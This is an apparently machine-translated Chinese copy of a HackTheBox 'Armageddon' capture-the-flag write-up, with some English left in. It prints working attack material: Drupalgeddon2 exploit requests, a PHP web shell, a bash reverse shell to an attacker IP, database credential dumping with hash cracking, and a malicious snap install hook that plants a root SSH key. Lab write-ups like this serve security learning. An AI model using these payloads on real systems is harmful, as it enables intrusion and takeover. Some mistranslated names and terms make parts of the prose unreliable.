# 
cms 数据库
snap install 提权




# 高温透析器：世界末日

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/07/24/htb-armageddon.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Farmageddon-cover.) 

阿加盖登是一个针对初学者的盒子。Drupalgeddon2是一个立足点漏洞利用脚本，可用于上传网络外壳和运行命令。我将访问数据库并获取管理员的哈希值，破解它，并发现密码也在主机上重复使用。要获取 root 用户，我将滥用管理员以 root 身份安装 snap 软件包的功能。

## 箱子信息

名字

[末日](https://www.hackthebox.eu/home/machines/profile/323) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-armageddon.png) 

发行日期

[27 3月 2021](https://twitter.com/hackthebox_eu/status/1417839437493506048)

停用日期

24 7月 2021

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Farmageddon-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Farmageddon-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

06 分 59 秒[![卡拉卡尔](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F219989)](https://www.hackthebox.eu/home/users/profile/219989)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

27 分 17 秒[![断续器](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F13569)](https://www.hackthebox.eu/home/users/profile/13569)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F27897)](https://www.hackthebox.eu/home/users/profile/27897)-

## 侦察

### n地图

`nmap`找到两个打开的 TCP 端口，即固态混合端口 （22） 和 HTTP （80）：

    oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.233
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 06:49 EDT
    Nmap scan report for 10.10.10.233
    Host is up (0.091s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
    
    oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.233
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 06:50 EDT
    Nmap scan report for 10.10.10.233
    Host is up (0.090s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
    |   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
    |_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
    80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
    |_http-generator: Drupal 7 (http://drupal.org)
    | http-robots.txt: 36 disallowed entries (15 shown)
    | /includes/ /misc/ /modules/ /profiles/ /scripts/ 
    | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
    | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
    |_/LICENSE.txt /MAINTAINERS.txt
    |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
    |_http-title: Welcome to  Armageddon |  Armageddon
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 10.76 seconds
    

根据[阿帕奇](https://access.redhat.com/solutions/445713)版本，主机可能运行的是 CentOS 7。HTTP托管了一个Drupal 7实例，并且有一个包含一堆路径的文件，我可能想要更详细地查看。`robots.txt`

### 网站 - TCP 80

#### 网站

该网站没有太多内容：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210326065540144.png) 

在页面源代码中，Drupal版本很清楚：

    <meta name="Generator" content="Drupal 7 (http://drupal.org)" />
    

该文件看起来与[Drupal的GitHub](https://github.com/drupal/drupal/blob/7.x/robots.txt)上的文件完全相同，因此那里没有什么有趣的。我确实将GitHub上的分支更改为7.X，以获取最接近世界末日版本以查看匹配的代码。`robots.txt`

我可以尝试创建一个帐户，但该过程涉及接收电子邮件，这在HTB上通常不是一个选项。我可以尝试查看它是否会发送到我的IP，但是该网站抛出错误，表明它无法发送：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210326070019500.png) 

#### 版本

在德鲁帕尔 [GitHub](https://github.com/drupal/drupal/tree/7.x) 中，根目录有一个文件 。该文件也存在于世界末日：`CHANGELOG.txt`

    oxdf@parrot$ curl -s 10.10.10.233/CHANGELOG.txt | head
    
    Drupal 7.56, 2017-06-21
    -----------------------
    - Fixed security issues (access bypass). See SA-CORE-2017-003.
    
    Drupal 7.55, 2017-06-07
    -----------------------
    - Fixed incompatibility with PHP versions 7.0.19 and 7.1.5 due to duplicate
      DATE_RFC7231 definition.
    - Made Drupal core pass all automated tests on PHP 7.1.
    

This gives the exact version, 7.56.

#### Exploits

`serachsploit` shows a bunch of Drupal exploits (snipped out ones for non-7 versions):

    oxdf@parrot$ searchsploit drupal 7
    ----------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                         |  Path
    ----------------------------------------------------------------------- ---------------------------------
    ...[snip]...
    Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)      | php/webapps/34992.py
    Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)       | php/webapps/44355.php
    Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password | php/webapps/34984.py
    Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password | php/webapps/34993.php
    Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Executio | php/webapps/35150.php
    Drupal 7.12 - Multiple Vulnerabilities                                 | php/webapps/18564.txt
    Drupal 7.x Module Services - Remote Code Execution                     | php/webapps/41564.php
    ...[snip]...
    Drupal < 7.34 - Denial of Service                                      | php/dos/35415.txt
    Drupal < 7.34 - Denial of Service                                      | php/dos/35415.txt
    Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploi | php/webapps/44557.rb
    Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution  | php/webapps/44542.txt
    Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/webapps/44449.rb
    Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/webapps/44449.rb
    Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/remote/44482.rb
    Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/remote/44482.rb
    Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/webapps/44448.py
    Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote | php/remote/46510.rb
    Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution         | php/webapps/46452.txt
    Drupal < 8.6.9 - REST Module Remote Code Execution                     | php/webapps/46459.py
    ...[snip]...
    ----------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    

这里显然有很多。德鲁帕尔格登2号和3号看起来都像候选人。

## 壳牌 饰 阿帕奇

### RCE - 德鲁帕尔格登2

鉴于漏洞利用的数量以及质量可能遍布地图的事实，我去了Google，找到了[这个存储库](https://github.com/dreadlocked/Drupalgeddon2)。我将看看它在超越根中到底在做什么，但存储库本身效果很好。运行它时会出现一个提示：`searchsploit`

    oxdf@parrot$ /opt/Drupalgeddon2/drupalgeddon2.rb http://10.10.10.233
    [*] --==[::#Drupalggedon2::]==--
    --------------------------------------------------------------------------------
    [i] Target : http://10.10.10.233/
    --------------------------------------------------------------------------------
    [+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
    [+] Drupal!: v7.56
    --------------------------------------------------------------------------------
    [*] Testing: Form   (user/password)
    [+] Result : Form valid
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    [*] Testing: Clean URLs
    [!] Result : Clean URLs disabled (HTTP Response: 404)
    [i] Isn't an issue for Drupal v7.x
    --------------------------------------------------------------------------------
    [*] Testing: Code Execution   (Method: name)
    [i] Payload: echo SNQOQAOF
    [+] Result : SNQOQAOF
    [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
    --------------------------------------------------------------------------------
    [*] Testing: Existing file   (http://10.10.10.233/shell.php)
    [!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    [*] Testing: Writing To Web Root   (./)
    [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
    [+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
    [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
    --------------------------------------------------------------------------------
    [i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
    armageddon.htb>> 
    

提示的工作方式类似于 shell：

    armageddon.htb>> id
    uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
    

提示符之前的最后一行表明它只是有一个正在运行的网页外壳。它的工作原理：

    oxdf@parrot$ curl 'http://10.10.10.233/shell.php' -d 'c=id'
    uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
    

### 壳

为了获得一个外壳，我用Bash反向外壳触发了相同的网络外壳：

    oxdf@parrot$ curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.7/443 0>&1" 'http://10.10.10.233/shell.php'
    

`curl`挂起，但在我的听力：`nc`

    oxdf@parrot$ nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.7] from (UNKNOWN) [10.10.10.233] 36008
    bash: no job control in this shell
    bash-4.2$ id
    id
    uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
    

我试图进行shell升级，但它抱怨没有PTY设备：

    bash-4.2$ python3 -c 'import pty;pty.spawn("bash")'
    python3 -c 'import pty;pty.spawn("bash")'
    Traceback (most recent call last):
      File "<string>", line 1, in <module>
      File "/usr/lib64/python3.6/pty.py", line 154, in spawn
        pid, master_fd = fork()
      File "/usr/lib64/python3.6/pty.py", line 96, in fork
        master_fd, slave_fd = openpty()
      File "/usr/lib64/python3.6/pty.py", line 29, in openpty
        master_fd, slave_name = _open_terminal()
      File "/usr/lib64/python3.6/pty.py", line 59, in _open_terminal
        raise OSError('out of pty devices')
    OSError: out of pty devices
    

我无法找到解决这个问题的方法。我真的不需要PTY shell，但如果我这样做了，我会尝试上传下一个。`socat`

## 壳 饰 布鲁斯特阿拉德明

### 列举

#### 用户

通常，我会去看一下盒子里的其他用户是什么，以及我下一步可能想要转向的地方。有趣的是，我在以下位置看不到任何内容：`/home``/home`

    bash-4.2$ ls -l /home
    ls -l /home
    ls: cannot open directory /home: Permission denied
    

看看，还有一个有趣的描述，布鲁斯阿拉德明：`/etc/passwd`

    bash-4.2$ cat /etc/passwd | grep sh
    cat /etc/passwd | grep sh
    root:x:0:0:root:/root:/bin/bash
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
    apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
    brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
    

#### 德鲁帕尔配置

apache无法访问太多，所以回到Web目录。中有一个文件。它有数据库信誉：`settings.php``/var/www/html/sites/default`

    $databases = array (
      'default' =>
      array (
        'default' =>
        array (
          'database' => 'drupal',
          'username' => 'drupaluser',
          'password' => 'CQHEy@9M*m23gBVj',
          'host' => 'localhost',
          'port' => '',
          'driver' => 'mysql',
          'prefix' => '',
        ),
      ),
    );
    

其他所有内容看起来都是默认的。

#### 数据库

因为我的 shell 不在 PTY 中，所以我必须从命令行运行 DB 命令。德鲁帕尔创建了一堆表格：

    bash-4.2$ mysql -e 'show tables;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
    Tables_in_drupal
    actions
    authmap
    batch
    block
    ...[snip]...
    users
    users_roles
    variable
    watchdog
    

我立即对 感兴趣。`users`

    bash-4.2$ mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
    uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
    0                                               NULL    0       0       0       0       NULL            0               NULL
    1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London              0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
    

有一个哈希值用于布鲁斯特阿拉德明。

### 哈什卡特

该哈希与[示例哈希页面上](https://hashcat.net/wiki/doku.php?id=example_hashes) Drupal 7 的格式匹配。哈希猫将很快破解它，找到密码“嘘声”。`hashcat -m 7900 brucetherealadmin-hash /usr/share/wordlists/rockyou.txt`

### 固态混合苯

此密码适用于 SSH 访问：

    oxdf@parrot$ sshpass -p booboo ssh brucetherealadmin@10.10.10.233
    Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
    Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.7
    [brucetherealadmin@armageddon ~]$ 
    

我可以抓住：`user.txt`

    [brucetherealadmin@armageddon ~]$ cat user.txt
    be57c4e6************************
    

## 外壳作为根

### 列举

布鲁瑟阿拉德明可以作为根运行快照安装：

    [brucetherealadmin@armageddon ~]$ sudo -l
    Matching Defaults entries for brucetherealadmin on armageddon:
        !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
        LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
        XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
    
    User brucetherealadmin may run the following commands on armageddon:
        (root) NOPASSWD: /usr/bin/snap install *
    

### 恶意快照包

谷歌搜索马利奥克斯快照包将我带到了2019年一篇关于[脏袜子](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html)的文章。这不是这里的漏洞，但他们使用了一个恶意的快照包来利用脏袜子漏洞，我记得在HTB上玩弄脏袜子并写了[这篇文章](https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html)。

“脏袜子”帖子中有一个部分介绍了如何创建快照包：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210326151833655.png) 

我从 Ubuntu VM 上工作来制作快照，然后按照说明进行操作。已安装工具：

    sudo snap install --classic snapcraft
    

现在，我将找到一个要处理的目录，然后运行 。它创建一个目录，其中包含：`snapcraft init``snap``snapcraft.yaml`

    df@buntu:~$ cd /tmp/
    df@buntu:/tmp$ mkdir dirty_snap
    df@buntu:/tmp$ cd dirty_snap/
    df@buntu:/tmp/dirty_snap$ snapcraft init
    Created snap/snapcraft.yaml.
    Go to https://docs.snapcraft.io/the-snapcraft-format/8337 for more information about the snapcraft.yaml format.
    

我将准备安装挂钩：

    oxdf@parrot$ mkdir snap/hooks
    oxdf@parrot$ touch snap/hooks/install
    oxdf@parrot$ chmod a+x snap/hooks/install
    

示例中的下一步，它们保存到 Bash 脚本中，该脚本创建用户并将其添加到组中。我将让我的只是将公共SSH密钥写入根文件：`install``sudoers``authorized_keys`

    df@buntu:/tmp/dirty_snap$ cat > snap/hooks/install << "EOF"
    #!/bin/bash
    
    mkdir -p /root/.ssh
    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > /root/.ssh/authorized_keys
    EOF
    

下一个文件 ， 只是样板文件。我只用这个例子：`snapcraft.yaml`

    df@buntu:/tmp/dirty_snap$ cat > snap/snapcraft.yaml << "EOF"
    name: armageddon
    version: '0.1' 
    summary: Empty snap, used for exploit
    description: |
        pwn armageddon                              
           
    grade: devel
    confinement: devmode
    
    parts:
      my-part:
        plugin: nil
    EOF
    

现在在运行上，它会创建包：`snapcraft`

    df@buntu:/tmp/dirty_snap$ snapcraft
    This snapcraft project does not specify the base keyword, explicitly setting the base keyword enables the latest snapcraft features.
    This project is best built on 'Ubuntu 16.04', but is building on a 'Ubuntu 20.04' host.
    Read more about bases at https://docs.snapcraft.io/t/base-snaps/11198
    Pulling my-part 
    Building my-part 
    Staging my-part 
    Priming my-part 
    Snapping 'armageddon' |                                                                                      
    Snapped armageddon_0.1_amd64.snap
    df@buntu:/tmp/dirty_snap$ ls *.snap
    armageddon_0.1_amd64.snap
    

### 转移到世界末日

我将在我的本地框上的目录中启动一个 Python HTTP 服务器，其中快照包位于：

    oxdf@parrot$ sudo python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    

现在从世界末日，我会要求它。 未安装，但为：`wget``curl`

    [brucetherealadmin@armageddon shm]$ curl 10.10.14.7/armageddon_0.1_amd64.snap -o armageddon_0.1_amd64.snap
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100  4096  100  4096    0     0  21478      0 --:--:-- --:--:-- --:--:-- 21671
    

### 安装快照

要安装该软件包，我将运行该命令并将其传递给快照。它失败了：`sudo`

    [brucetherealadmin@armageddon shm]$ sudo snap install armageddon_0.1_amd64.snap 
    error: cannot find signatures with metadata for snap "armageddon_0.1_amd64.snap"
    

一些[谷歌搜索](https://askubuntu.com/questions/822765/snap-install-failure-error-cannot-find-signatures-with-metadata-for-snap)此错误建议添加 ，现在给出一个不同的错误：`--dangerous`

    [brucetherealadmin@armageddon shm]$ sudo snap install --dangerous armageddon_0.1_amd64.snap 
    error: snap "armageddon_0.1_amd64.snap" requires devmode or confinement override
    

谷歌搜索导致[有关 的帖子](https://askubuntu.com/questions/783945/what-is-devmode-for-snaps)，其工作原理：`--devmode`

    [brucetherealadmin@armageddon shm]$ sudo snap install --devmode armageddon_0.1_amd64.snap 
    armageddon 0.1 installed
    

### 固态混合苯

如果该安装像我希望的那样工作，我的公钥现在在 中，我应该能够与SSH连接。成功了：`/root/.ssh/authorized_keys`

    oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.10.233
    Last login: Fri Mar 19 07:56:39 2021
    [root@armageddon ~]# 
    

我可以得到根标志：

    [root@armageddon ~]# cat root.txt
    a289b09c************************
    

## 超越根

为了查看该 Ruby 脚本，我在 Burp 中设置了一个新的侦听器，该侦听器将侦听端口 8888 并将所有流量转发到 10.10.10.233 端口 80：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210326161915166.png) 

然后我运行了漏洞利用定位：`http://127.0.0.1:8888`

    oxdf@parrot$ /opt/Drupalgeddon2/drupalgeddon2.rb http://127.0.0.1:8888
    [*] --==[::#Drupalggedon2::]==--
    --------------------------------------------------------------------------------
    [i] Target : http://127.0.0.1:8888/
    --------------------------------------------------------------------------------
    [+] Found  : http://127.0.0.1:8888/CHANGELOG.txt    (HTTP Response: 200)
    [+] Drupal!: v7.56
    --------------------------------------------------------------------------------
    [*] Testing: Form   (user/password)
    [+] Result : Form valid
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    [*] Testing: Clean URLs
    [!] Result : Clean URLs disabled (HTTP Response: 404)
    [i] Isn't an issue for Drupal v7.x
    --------------------------------------------------------------------------------
    [*] Testing: Code Execution   (Method: name)
    [i] Payload: echo TRZZJAMZ
    [+] Result : TRZZJAMZ
    [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
    --------------------------------------------------------------------------------
    [*] Testing: Existing file   (http://127.0.0.1:8888/shell.php)
    [i] Response: HTTP 404 // Size: 5
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    [*] Testing: Writing To Web Root   (./)
    [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
    [+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
    [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
    --------------------------------------------------------------------------------
    [i] Fake PHP shell:   curl 'http://127.0.0.1:8888/shell.php' -d 'c=hostname'
    armageddon.htb>>
    

打嗝中有八个新请求：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210326163257806.png) 

它做的第一件事是拉动 ，就像我上面所做的那样。然后它尝试几个路径到这个形式，得到500和404。它回到给出500的那个，并添加了额外的参数：`CHANGELOG.txt``/user/password`

    POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20VQMJGJAU HTTP/1.1
    User-Agent: drupalgeddon2
    Connection: close
    Host: 127.0.0.1:8888
    Content-Length: 47
    Content-Type: application/x-www-form-urlencoded
    
    form_id=user_pass&_triggering_element_name=name
    

The field is set to a command. I’m not going to dive too much deeper into the details of why this executes - [This post](https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/) from Checkpoint does a really nice job going into the details. But to see what the script does, it first sends the request above with the final bit being . This is just to verify that the exploit works. Then it tries to talk to the backdoor (presumably to see if it’s already uploaded). When that fails (404), it sends the next request:`name[%23markup]``echo VQMJGJAU`

    POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20|%20base64%20-d%20|%20tee%20shell.php HTTP/1.1
    User-Agent: drupalgeddon2
    Connection: close
    Host: 127.0.0.1:8888
    Content-Length: 47
    Content-Type: application/x-www-form-urlencoded
    
    form_id=user_pass&_triggering_element_name=name
    

这次的命令是：

    echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
    

base64 字符串被注入以对其进行解码，然后将其输出到粘贴中_并将其_写入 。`base64``tee``shell.php`

该命令解码为 PHP 网页外壳：

    <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
    

现在有一个请求是成功的（运行命令以设置提示），现在它留给用户发出其他命令。`shell.php``hostname`

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/07/24/htb-armageddon.html)